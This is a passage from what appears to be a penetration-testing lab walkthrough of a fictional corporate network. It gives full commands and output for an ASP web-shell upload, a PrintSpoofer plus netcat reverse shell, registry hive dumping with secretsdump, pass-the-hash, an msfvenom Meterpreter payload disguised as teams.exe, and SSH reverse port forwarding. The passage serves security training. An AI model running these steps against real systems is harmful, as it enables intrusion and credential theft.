<p>What&#39;s also interesting about DNN is we can <a href="https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload">change the allowable file extensions</a> to allow <code>.asp</code> and <code>.aspx</code> files to be uploaded. This is useful if we cannot gain RCE via the SQL console. If this is successful, we can upload an ASP web shell and gain remote code execution on the <code>DEV01</code> server. The allowed file extensions list can be modified to include .asp and .aspx by browsing to <code>Settings -&gt; Security -&gt; More -&gt; More Security Settings</code> and adding them under <code>Allowable File Extensions</code>, and clicking the <code>Save</code> button. Once this is done, we can upload an <a href="https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp">ASP webshell</a> after browsing to <code>http://172.16.8.20/admin/file-management</code>. Click the upload files button and select the ASP web shell we downloaded to our attack host.</p>
<p>Once uploaded, we can right-click on the uploaded file and select <code>Get URL</code>. The resultant URL will allow us to run commands via the web shell, where we could then work to get a reverse shell or perform privilege escalation steps, as we&#39;ll see next.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/asp\_webshell.png" alt="text"></p>
<hr>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Next, we need to escalate privileges. In the command output above, we saw that we have <code>SeImpersonate</code> privileges. Following the steps in the <a href="https://academy.hackthebox.com/module/67/section/607">SeImpersonate and SeAssignPrimaryToken</a> section in the <code>Windows Privilege Escalation</code> module, we can work to escalate our privileges to SYSTEM, which will result in an initial foothold in the Active Directory (AD) domain and allow us to begin enumerating AD.</p>
<p>We&#39;ll try escalating privileges using the <code>PrintSpoofer</code> tool and then see if we can dump any useful credentials from the host&#39;s memory or registry. We&#39;ll need nc.exe on the DEV01 host to send ourselves a shell and the PrintSpoofer64.exe binary to leverage <code>SeImpersonate</code> privileges. There are a few ways we can transfer them up there. We could use the <code>dmz01</code> host as a &quot;jump host&quot; and transfer our tools through it via SCP and then start a Python3 web server and download them onto the DEV01 host using <code>certutil</code>.</p>
<p>An easier way would be to modify the DNN <code>Allowable File Extensions</code> once again to allow the <code>.exe</code> file format. We can then upload both of these files and confirm via our shell that they are located in <code>c:\DotNetNuke\Portals\0</code>.</p>
<p>Once uploaded, we can start a <code>Netcat</code> listener on the <code>dmz01</code> host and run the following command to obtain a reverse shell as <code>NT AUTHORITY\SYSTEM</code>:</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">c:<span class="hljs-symbol">\D</span>otNetNuke<span class="hljs-symbol">\P</span>ortals<span class="hljs-symbol">\0</span><span class="hljs-symbol">\P</span>rintSpoofer64.exe -c "c:<span class="hljs-symbol">\D</span>otNetNuke<span class="hljs-symbol">\P</span>ortals<span class="hljs-symbol">\0</span><span class="hljs-symbol">\n</span>c.exe 172.16.8.120 443 -e cmd"
</code></pre>
<p>We execute the command and get a reverse shell almost instantly.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">root@dmz01:/tmp<span class="hljs-comment"># nc -lnvp 443</span>

Listening <span class="hljs-literal">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">443</span>
Connection received <span class="hljs-literal">on</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">8.20</span> <span class="hljs-number">58480</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.107</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="hljs-string">\Windows\system32&gt;whoami</span>
whoami
nt authority<span class="hljs-string">\system</span>

C:<span class="hljs-string">\Windows\system32&gt;hostname</span>
hostname
ACADEMY-AEN-DEV01
</code></pre>
<p>From here, we can perform some post-exploitation and manually retrieve the contents of the SAM database and with it, the local administrator password hash.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-cmd-session">c:\DotNetNuke\Portals\0&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SYSTEM SYSTEM.<span class="hljs-keyword">SAVE</span>
<span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SYSTEM SYSTEM.<span class="hljs-keyword">SAVE</span>

The operation completed successfully.

c:\DotNetNuke\Portals\0&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SECURITY SECURITY.<span class="hljs-keyword">SAVE</span>
<span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SECURITY SECURITY.<span class="hljs-keyword">SAVE</span>

The operation completed successfully.

c:\DotNetNuke\Portals\0&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SAM SAM.<span class="hljs-keyword">SAVE</span>
<span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SAM SAM.<span class="hljs-keyword">SAVE</span>

The operation completed successfully.
</code></pre>
<p>Now we can once again modify the allowed file extensions to permit us to down the <code>.SAVE</code> files. Next, we can go back to the <code>File Management</code> page and download each of the three files to our attack host.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/download\_sam.png" alt="text"></p>
<p>Finally, we can use <code>secretsdump</code> to dump the SAM database and retrieve a set of credentials from LSA secrets.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright<span class="hljs-number"> 2021 </span>SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;redacted&gt;:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240<span class="hljs-comment">#hporter#f7d7bba128ca183106b8a3b3de5924bc</span>
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
<span class="hljs-number"> 0000 </span> <span class="hljs-number"> 21 </span>0C E6 AC 8B<span class="hljs-number"> 08 </span>9B<span class="hljs-number"> 39 </span><span class="hljs-number"> 97 </span>EA D9 C6<span class="hljs-number"> 77 </span>DB<span class="hljs-number"> 10 </span>E6   !......9....w...
<span class="hljs-number"> 0010 </span>  2E B2<span class="hljs-number"> 53 </span>43 7E B8<span class="hljs-number"> 06 </span>64  B3 EB<span class="hljs-number"> 89 </span>B1 DA D1<span class="hljs-number"> 22 </span>C7   ..SC~..d......".
<span class="hljs-number"> 0020 </span> <span class="hljs-number"> 11 </span>83 FA<span class="hljs-number"> 35 </span>DB<span class="hljs-number"> 57 </span>3E B0  9D<span class="hljs-number"> 84 </span>59<span class="hljs-number"> 41 </span>90<span class="hljs-number"> 18 </span>7A 8D   ...5.W&gt;...YA..z.
<span class="hljs-number"> 0030 </span>  ED C9 1C<span class="hljs-number"> 26 </span>FF B7 DA 6F <span class="hljs-number"> 02 </span>C9 2E<span class="hljs-number"> 18 </span>9D CA<span class="hljs-number"> 08 </span>2D   ...&amp;...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up...
</code></pre>
<p>We confirm that these credentials work using <code>CrackMapExec</code> and we now have a way back to this system should we lose our reverse shell.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains crackmapexec smb <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span> --local-auth -u administrator -H &lt;redacted&gt;

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>
[*] Initializing LDAP protocol database
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">135</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>     <span class="hljs-number">445</span>    ACADEMY-AEN-DEV  [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:<span class="hljs-literal">False</span>) (SMBv1:<span class="hljs-literal">False</span>)
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
SMB         <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>     <span class="hljs-number">445</span>    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator &lt;redacted&gt; (Pwn3d!)
</code></pre>
<p>From the <code>secretsdump</code> output above, we notice a cleartext password, but it&#39;s not immediately apparent which user it&#39;s for. We could dump LSA again using <code>CrackMapExec</code> and confirm that the password is for the <code>hporter</code> user.</p>
<p>We now have our first set of domain credentials for the INLANEFREIGHT.LOCAL domain, <code>hporter:Gr8hambino!</code>. We can confirm this from our reverse shell on <code>dmz01</code>.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-cmd-session">c:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">hporter</span> /dom
net <span class="hljs-keyword">user</span> <span class="hljs-title">hporter</span> /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

<span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          <span class="hljs-number">000</span> (System Default)
Account active               Yes
Account expires              Never

Password last set            <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">05</span> AM
Password expires             Never
Password changeable          <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">05</span> AM
Password required            Yes
<span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes

Workstations allowed         All
Logon script                 
<span class="hljs-keyword">User</span> <span class="hljs-title">profile</span>                 
Home directory               
Last logon                   <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">03</span>:<span class="hljs-number">10</span> AM

Logon hours allowed          All

Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>      
Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users         
The command completed successfully.
</code></pre>
<p>We could also escalate privileges on the DEV01 host using the <code>PrintNightmare</code> vulnerability. There are also other ways to retrieve the credentials, such as using Mimikatz. Play around with this machine and apply the various skills you learned in the <code>Penetration Tester Path</code> to perform these steps in as many ways as possible to practice and find what works best for you.</p>
<p>At this point, we don&#39;t have any additional findings to write down because all we did was abuse built-in functionality, which we could perform because of the file share issues noted previously. We could note down <code>PrintNightmare</code> as a high-risk finding if we can exploit it.</p>
<hr>
<h3 id="alternate-method-reverse-port-forwarding">Alternate Method - Reverse Port Forwarding</h3>
<p>There are many ways to attack this network and achieve the same results, so we will not cover them all here, but one worth mentioning is <a href="https://academy.hackthebox.com/module/158/section/1427">Remote/Reverse Port Forwarding with SSH</a>. Let&#39;s say we want to return a reverse shell from the <code>DEV01</code> box to our attack host. We can&#39;t do this directly since we&#39;re not in the same network, but we can leverage <code>dmz01</code> to perform reverse port forwarding and achieve our goal. We may want to get a Meterpreter shell on the target or a reverse shell directly for any number of reasons. We could have also performed all of these actions without ever getting a shell, as we could have used <code>PrintSpoofer</code> to add a local admin or dump credentials from <code>DEV01</code> and then connect to the host in any number of ways from our attack host using Proxychains (pass-the-hash, RDP, WinRM, etc.). See how many ways you can achieve the same task of interacting with the <code>DEV01</code> host directly from your attack host. It&#39;s essential to be versatile, and this lab network is a great place to practice as many techniques as possible and hone our skills.</p>
<p>Let&#39;s walk through the reverse port forwarding method quickly. First off, we need to generate a payload using <code>msfvenom</code>. Note that here we&#39;ll specify the IP address of the <code>dmz01</code> pivot host in the <code>lhost</code> field and NOT our attack host IP as the target would not be able to connect back to us directly.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_https lhost=<span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.120</span> -f exe -o teams.exe LPORT=<span class="hljs-number">443</span>

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">787</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-string">as:</span> teams.exe
</code></pre>
<p>Next, we need to set up a <code>multi/handler</code> and start a listener on a different port than the payload we generated will use.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(windows/smb/smb_delivery) &gt;&gt; use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set payload windows/x64/meterpreter/reverse_https
payload =&gt; windows/x64/meterpreter/reverse_https
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set lport 7000
lport =&gt; 7000
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
</code></pre>
<p>Next, we need to upload the <code>teams.exe</code> reverse shell payload to the <code>DEV01</code> target host. We can SCP it up to <code>dmz01</code>, start a Python web server on that host and then download the file. Alternatively, we can use the DNN file manager to upload the file as we did previously. With the payload on the target, we need to set up <code>SSH remote port forwarding</code> to forward the dmz01 pivot box port <code>443</code> to the Metasploit listener port <code>7000</code>. The <code>R</code> flag tells the pivot host to listen on port <code>443</code> and forward all incoming traffic to this port to our Metasploit listener at <code>0.0.0.0:7000</code> configured on our attack host.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -i dmz01_key -R <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">443</span>:<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">7000</span> root@<span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.111</span> -vN

OpenSSH_8.<span class="hljs-number">4p1</span> Debian-<span class="hljs-number">5</span>, OpenSSL <span class="hljs-number">1.1</span>.1n  <span class="hljs-number">15</span> Mar <span class="hljs-number">2022</span>
<span class="hljs-symbol">debug1:</span> Reading configuration data /etc/ssh/ssh_config
<span class="hljs-symbol">debug1:</span> /etc/ssh/ssh_config line <span class="hljs-number">19</span>: include /etc/ssh/ssh_config.d/*.conf matched no files
<span class="hljs-symbol">debug1:</span> /etc/ssh/ssh_config line <span class="hljs-number">21</span>: Applying options for *
<span class="hljs-symbol">debug1:</span> Connecting to <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.111</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.111</span>] port <span class="hljs-number">22</span>.

&lt;SNIP&gt;
<span class="hljs-symbol">
debug1:</span> Authentication succeeded (publickey).
Authenticated to <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.111</span> ([<span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.111</span>]:<span class="hljs-number">22</span>).
<span class="hljs-symbol">debug1:</span> Remote connections from <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">443</span> forwarded to local address <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">7000</span>
<span class="hljs-symbol">debug1:</span> Requesting no-more-sessions@openssh.com
<span class="hljs-symbol">debug1:</span> Entering interactive session.
<span class="hljs-symbol">debug1:</span> pledge: network
<span class="hljs-symbol">debug1:</span> client_input_global_request: rtype hostkeys-<span class="hljs-number">00</span>@openssh.com want_reply <span class="hljs-number">0</span>
<span class="hljs-symbol">debug1:</span> Remote: /root/.ssh/authorized_keys:<span class="hljs-number">1</span>: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
<span class="hljs-symbol">debug1:</span> Remote: /root/.ssh/authorized_keys:<span class="hljs-number">1</span>: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
<span class="hljs-symbol">debug1:</span> Remote: Forwarding listen address <span class="hljs-string">"172.16.8.120"</span> overridden by server GatewayPorts
<span class="hljs-symbol">debug1:</span> remote forward success for: listen <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">443</span>, connect <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">7000</span>
</code></pre>
<p>Next, execute the teams.exe payload from the <code>DEV01</code> host, and if all goes to plan, we&#39;ll get a connection back.</p>
<p>Exploitation &amp; Privilege Escalation</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">msf</span>](<span class="hljs-name">Jobs:0</span> Agents:0) exploit(<span class="hljs-name">multi/handler</span>) &gt;&gt; exploit

[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Started reverse TCP handler on <span class="hljs-number">0.0</span>.0.0:7000 
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Sending stage (<span class="hljs-name">175174</span> bytes) to <span class="hljs-number">127.0</span>.0.1
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Meterpreter session <span class="hljs-number">2</span> opened (<span class="hljs-name">127.0.0.1:7000</span> -&gt; <span class="hljs-number">127.0</span>.0.1:51146 ) at <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-22</span> <span class="hljs-number">12</span>:21:25 <span class="hljs-number">-0400</span>

(<span class="hljs-name">Meterpreter</span> <span class="hljs-number">2</span>)(<span class="hljs-name">c:</span>\windows\system32\inetsrv) &gt; getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
</code></pre>
<p>A caveat to the above method is that, by default, OpenSSH only allows connection to remote forwarded ports from the server itself (localhost). To allow this, we must edit the <code>/etc/ssh/sshd_config</code> file on Ubuntu systems and change the line <code>GatewayPorts no</code> to <code>GatewayPorts yes</code>, otherwise we will not be able to get a call back on the port we forwarded in the SSH command (port 443 in our case). To do this, we would need root SSH access to the host we are using to pivot from. At times we will see this configuration set up like this, so it works straight away, but if we don&#39;t have root access to the host with the ability to temporarily modify the SSH config file (and reload it to take effect using <code>service sshd reload</code>), then we won&#39;t be able to perform port forwarding in this way. Keep in mind that this type of change opens up a security hole in the client&#39;s system, so you&#39;d want to clear it with them, note down the change, and make every effort to revert it at the end of testing. This <a href="https://www.ssh.com/academy/ssh/tunneling/example">post</a> is worth reading to understand SSH Remote Forwarding better.</p>
<hr>
<h3 id="off-to-a-good-start">Off to a Good Start</h3>
<p>Now that we&#39;ve enumerated the internal network attacked our first host, escalated privileges, performed post-exploitation, and set up our pivots/multiple ways to assess the internal network, let&#39;s turn our attention to the AD environment. Given that we have a set of credentials, we can perform all sorts of enumeration to get a better lay of the land and look for pathways to Domain Admin.</p>
<h2 id="lateral-movement">Lateral Movement</h2>
<hr>
<p>After pillaging the host <code>DEV01</code>, we found the following set of credentials by dumping LSA secrets:</p>
<p><code>hporter:Gr8hambino!</code></p>
<p>The <code>Active Directory Enumeration &amp; Attacks</code> module demonstrates various ways to enumerate AD from a Windows host. Since we&#39;ve got our hooks deep into <code>DEV01</code> we can use it as our staging area for launching further attacks. We&#39;ll use the reverse shell that we caught on the <code>dmz01</code> host after exploiting <code>PrintSpoofer</code> for now since it&#39;s rather stable. At a later point, we may want to perform some additional &quot;port forwarding gymnastics&quot; and connect via RDP or WinRM, but this shell should be plenty.</p>
<p>We&#39;ll use the <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound</a> collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI for review. We can download the executable (though in a real-world assessment, it&#39;s best to compile our own tools) and use the handy DNN file manager to upload it to the target. We want to gather as much data as possible and don&#39;t have to worry about evasion, so we&#39;ll use the <code>-c All</code> flag to use all collection methods.</p>
<p>Lateral Movement</p>
<pre><code class="lang-cmd-session">c:\DotNetNuke\Portals\0&gt; SharpHound.exe -c All

2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:02:32.2363320<span class="hljs-string">-07</span>:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:02:32.2519575<span class="hljs-string">-07</span>:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:02:32.5800848<span class="hljs-string">-07</span>:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:02:32.7675820<span class="hljs-string">-07</span>:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:03.3301538<span class="hljs-string">-07</span>:00|INFORMATION|Status: 0 objects finished (<span class="hljs-string">+0</span> 0)/s -- Using 46 MB RAM
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:16.9238698<span class="hljs-string">-07</span>:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.1426009<span class="hljs-string">-07</span>:00|INFORMATION|Producer has finished, closing LDAP channel
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.1582366<span class="hljs-string">-07</span>:00|INFORMATION|LDAP channel closed, waiting for consumers
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.6738528<span class="hljs-string">-07</span>:00|INFORMATION|Consumers finished, closing output channel
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.7050961<span class="hljs-string">-07</span>:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.8769905<span class="hljs-string">-07</span>:00|INFORMATION|Status: 3641 objects finished (<span class="hljs-string">+3641</span> 79.15218)/s -- Using 76 MB RAM
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:18.8769905<span class="hljs-string">-07</span>:00|INFORMATION|Enumeration finished in 00:00:46.1149865
2022<span class="hljs-string">-06</span><span class="hljs-string">-22</span>T10:03:19.1582443<span class="hljs-string">-07</span>:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing!
</code></pre>
<p>This will generate a tidy Zip file that we can download via the DNN file management tool again (so convenient!). Next, we can start the <code>neo4j</code> service (<code>sudo neo4j start</code>), type <code>bloodhound</code> to open the GUI tool, and ingest the data.</p>
<p>Searching for our user <code>hporter</code> and selecting <code>First Degree Object Control</code>, we can see that the user has <code>ForceChangePassword</code> rights over the <code>ssmalls</code> user.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/hporter.png" alt="text"></p>
<p>As an aside, we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it <code>Excessive Active Directory Group Privileges</code> and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/all\_rdp.png" alt="text"></p>
<p>We can use <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">PowerView</a> to change the <code>ssmalls</code> user&#39;s password. Let&#39;s RDP to the target after checking to ensure the port is open. RDP will make it easier for us to interact with the domain via a PowerShell console, though we could still do this via our reverse shell access.</p>
<p>Lateral Movement</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -<span class="hljs-built_in">sT</span> -p <span class="hljs-number">3389</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">22</span> <span class="hljs-number">13</span>:<span class="hljs-number">35</span> EDT
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>:<span class="hljs-number">80</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8083</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.20</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>11s latency).

PORT     STATE SERVICE
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server

